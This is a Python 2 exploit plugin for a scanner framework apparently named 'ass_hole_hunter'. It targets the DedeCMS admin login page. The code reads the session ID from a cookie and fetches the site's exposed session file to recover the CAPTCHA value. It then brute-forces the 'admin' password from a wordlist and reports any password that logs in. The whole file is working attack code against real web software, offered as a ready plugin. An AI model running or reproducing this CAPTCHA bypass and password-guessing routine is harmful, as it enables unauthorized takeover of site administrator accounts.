#encoding: utf-8
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
from libs.functions import *
#import modules.*


class hunter_exploit:
    '''discuz'''
    infos = {
        'plugin_name':'Dedecms_burp',
        'author':'demon',
        'update':'2015/10/03',
        'site':'http://www.dawner.info',
        'vuln_type':'burp',
        'vuln_source':'http://www.wooyun.org/bugs/wooyun-2014-075051'
        }
    opts  = {
        'url':'192.168.1.254 or default',
        }


    def __init__(self,url):
        self.url = url

    def exploit(self):
        '''start exploit'''
        exp_url = self.url+'/dede/login.php'
        print exp_url
        cj =  cookielib.CookieJar()
        #proxy = urllib2.ProxyHandler({'http':'127.0.0.1:8080'})
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        opener.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0')]
        f = opener.open(exp_url)
        html = f.read()
        for cookie in cj: 
            ck = str(cookie)
            session = re.search(r'=.*\sf',ck).group(0)[1:-2]
            print session
        #time.sleep(2)
        session_url = self.url+'/data/sessions/sess_'+session
        tmp_url = self.url+'/include/vdimgck.php'
        print session_url
        #try:
        #    #tmp_resp = url_post(self.url+'/include/vdimgck.php').read()
        #    t = opener.open(tmp_url).read()
        #    #resp = url_post(session_url).read()
        #    #print "++"+resp+"++"
        #except Exception,e:
        #    print e
        passfile= 'dbs/exploit/pass_big.txt'
        log = open('log.txt',"a+")
        try:
            for line in open(passfile,'r+'):
                pwd = line.strip()
                print '[+]pwd:'+pwd
                t = opener.open(tmp_url).read()
                resp = url_post(session_url).read()
                match = re.search(r'".*"',resp)
                code =  match.group(0)[1:-1]
                value = {"gotopage":"","dopost":"login","adminstyle":"newdedecms","userid":"admin","pwd":pwd,"validate":code,"sm1":""}
                post_data=urllib.urlencode(value)
                headers ={"User-agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"}
                req=urllib2.Request(exp_url,post_data,headers)
                #value = 'gotopage=&dopost=login&adminstyle=newdedecms&userid=admin&pwd=admin&validate='+code+'&sm1='
                #resp = url_post(exp_url,value).read()
                req_resp = opener.open(req).read()

                print resp
                #if "..." in req_resp:
                if re.search("成功",req_resp):
                    print '[!]Dedecms exsit weak password.\n'
                    #log.writelines(req_resp)
                    #log.close()
                    #exp_url =  str(exp_url)
                    result = "[+]user:admin;pwd:"+pwd
                    return result
                else:
                    #log.writelines(req_resp)
                    print 'No.....'
                    pass
            log.close()
        except Exception,e:
            print e
